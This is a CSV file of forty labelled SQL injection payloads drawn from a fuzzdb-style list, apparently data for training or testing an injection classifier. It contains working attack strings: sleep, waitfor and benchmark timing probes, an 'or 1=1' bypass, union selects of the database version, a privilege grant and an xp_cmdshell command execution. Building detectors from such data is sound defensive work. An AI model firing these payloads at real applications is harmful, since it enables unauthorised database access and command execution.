id,payload,label
fuzzdb_0,sleep(__TIME__)#,sql_injection
fuzzdb_1,1 or sleep(__TIME__)#,sql_injection
fuzzdb_2,""" or sleep(__TIME__)#",sql_injection
fuzzdb_3,' or sleep(__TIME__)#,sql_injection
fuzzdb_4,""" or sleep(__TIME__)=""",sql_injection
fuzzdb_5,' or sleep(__TIME__)=',sql_injection
fuzzdb_6,1) or sleep(__TIME__)#,sql_injection
fuzzdb_7,""") or sleep(__TIME__)=""",sql_injection
fuzzdb_8,') or sleep(__TIME__)=',sql_injection
fuzzdb_9,1)) or sleep(__TIME__)#,sql_injection
fuzzdb_10,""")) or sleep(__TIME__)=""",sql_injection
fuzzdb_11,')) or sleep(__TIME__)=',sql_injection
fuzzdb_12,;waitfor delay '0:0:__TIME__'--,sql_injection
fuzzdb_13,);waitfor delay '0:0:__TIME__'--,sql_injection
fuzzdb_14,';waitfor delay '0:0:__TIME__'--,sql_injection
fuzzdb_15,""";waitfor delay '0:0:__TIME__'--",sql_injection
fuzzdb_16,');waitfor delay '0:0:__TIME__'--,sql_injection
fuzzdb_17,""");waitfor delay '0:0:__TIME__'--",sql_injection
fuzzdb_18,));waitfor delay '0:0:__TIME__'--,sql_injection
fuzzdb_19,'));waitfor delay '0:0:__TIME__'--,sql_injection
fuzzdb_20,"""));waitfor delay '0:0:__TIME__'--",sql_injection
fuzzdb_21,"benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_22,"1 or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_23,""" or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_24,"' or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_25,"1) or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_26,""") or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_27,"') or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_28,"1)) or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_29,""")) or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_30,"')) or benchmark(10000000,MD5(1))#",sql_injection
fuzzdb_31,; --,sql_injection
fuzzdb_32,'; --,sql_injection
fuzzdb_33,'); --,sql_injection
fuzzdb_34,'; exec master..xp_cmdshell 'ping 10.10.1.2'--,sql_injection
fuzzdb_35,' grant connect to name; grant resource to name; --,sql_injection
fuzzdb_36,' or 1=1 --,sql_injection
fuzzdb_37,' union (select @@version) --,sql_injection
fuzzdb_38,"' union (select NULL, (select @@version)) --",sql_injection
fuzzdb_39,"' union (select NULL, NULL, (select @@version)) --",sql_injection
